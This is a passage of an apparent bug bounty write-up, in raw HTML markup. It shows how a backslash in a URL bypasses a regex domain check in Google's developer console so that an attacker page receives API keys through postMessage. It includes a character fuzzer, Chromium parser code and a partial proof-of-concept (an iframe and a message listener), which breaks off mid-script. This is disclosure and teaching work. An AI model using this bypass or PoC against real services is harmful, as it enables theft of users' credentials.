           &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user:pass&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test.corp.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/path/to/something&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;param=value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Allright, so &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magicRegex.match(domainURL)[3]&lt;/code&gt; is the authority (domain). Again, I usually would have given up at this point, not sure why I continued. But I wanted to dig deeper and look at this regex.&lt;/p&gt;
&lt;p&gt;I put this regex in &lt;a href=&quot;https://www.debuggex.com/&quot; target=&quot;_blank&quot;&gt;www.debuggex.com&lt;/a&gt;. This is a really cool website, it visualises the regex and you can play with it real time and see how the matching happens.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/debuggex.png&quot; alt=&quot;The Image Generated by Debuggex&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I wanted to figure out what makes the regex think that the authority is over, and the port/path is coming. So I wanted to figure out what “ends the authority”.&lt;/p&gt;
&lt;p&gt;If we zoom in, we can see that this is the part we are looking for:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/debuggex-zoomed.png&quot; alt=&quot;Zoomed Image Generated by Debuggex&quot;/&gt;&lt;/p&gt;
&lt;p&gt;So, the authority ends with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;, and anything after is not the domain name anymore. All of those are valid, they do “end” the domain. But I had this idea that what if there is something else? We need a character that, when parsed by the browser, does end the authority, but when parsed by this regex, does not. This would allow us to bypass the check, since we could make something that would end in for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.corp.google.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Like this:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;https://xdavidhu.me[MAGIC_CHARACTER]test.corp.google.com
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;So, for the browser, the authority is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xdavidhu.me&lt;/code&gt;, but, for the regex the authority is the whole thing, which ends in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.corp.google.com&lt;/code&gt;, so the API key &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; is allowed to be sent.&lt;/p&gt;
&lt;p&gt;I started to look at HTTP / URL specifications, all of which are &lt;em&gt;really&lt;/em&gt; interesting, and I encourage you to explore these “lower-level” things as well. I didn’t quite find anything there that I wanted, but what I ended up doing and worked was that I wrote a little JavaScript fuzzer to test what ends the authority in an actual browser:&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt; !&quot;#$%&amp;amp;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;]^_`abcdefghijklmnopqrstuvwxyz{|}~&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://xdavidhu.me&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;.corp.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[+] &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -&amp;gt; &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[!] &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -&amp;gt; ERROR&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As you can see, what this script does is that it loops through the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;, puts all characters one-by-one in the middle of the URL, parses the URL and prints the authority.&lt;/p&gt;
&lt;p&gt;Besides many “negative” results, it produced 4 “positive” results. It found 4 characters that ended the authority:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;[+] https://xdavidhu.me/.corp.google.com -&amp;gt; xdavidhu.me
[+] https://xdavidhu.me?.corp.google.com -&amp;gt; xdavidhu.me
[+] https://xdavidhu.me#.corp.google.com -&amp;gt; xdavidhu.me
[+] https://xdavidhu.me\.corp.google.com -&amp;gt; xdavidhu.me
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This is just what we needed!&lt;/p&gt;
&lt;p&gt;In the browser, besides &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; also ends the authority!&lt;/p&gt;
&lt;p&gt;I tested it the 3 major browsers I had on hand (Firefox, Chrome, Safari) and all of them had the same result.&lt;/p&gt;
&lt;p&gt;After this, I found the source of this behaviour in &lt;a href=&quot;https://source.chromium.org/chromium/chromium/src/+/master:url/third_party/mozilla/url_parse.cc;l=821;&quot; target=&quot;_blank&quot;&gt;Chromium’s source code&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;IsAuthorityTerminator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IsURLSlash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'?'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'#'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsURLSlash&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;IsURLSlash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\\'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Again, I was always “afraid” to dig this deep, and would never have thought about looking into the source code of a browser, but after browsing around a bit, you realise that this code is also just code, and you can understand how it works. This is super and interesting and can be really helpful in many situations. I could have just looked into the source code to find this bug, skipping the whole fuzzer part.&lt;/p&gt;
&lt;p&gt;Using this bug, we can demo the exploit in the JS Console:&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Regex parsing&lt;/span&gt;
&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://user:pass@xdavidhu.me&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test.corp.google.com:8080/path/to/something?param=value#hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;magicRegex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://user:pass@xdavidhu.me&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test.corp.google.com:8080/path/to/something?param=value#hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
           &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user:pass&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdavidhu.me&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test.corp.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8080&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/path/to/something&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;param=value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Browser parsing&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://user:pass@xdavidhu.me&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;test.corp.google.com:8080/path/to/something?param=value#hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://user:pass@xdavidhu.me/test.corp.google.com:8080/path/to/something?param=value#hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://xdavidhu.me&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdavidhu.me&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;xdavidhu.me&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/test.corp.google.com:8080/path/to/something&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;?param=value&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;We can see that this works as we wanted it to, so we can make a POC, which will embed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt;, and grab the victim’s API key.&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://console.developers.google.com/henhouse/?pb=[&quot;hh-0&quot;,&quot;gmail&quot;,null,[],&quot;https://xdavidhu.me\\test.corp.google.com&quot;,null,[],null,&quot;Create API key&quot;,0,null,[],false,false,null,null,null,null,false,null,false,false,null,null,null,null,null,&quot;Quickstart&quot;,true,&quot;Quickstart&quot;,null,null,false]'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;apikey-credential&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
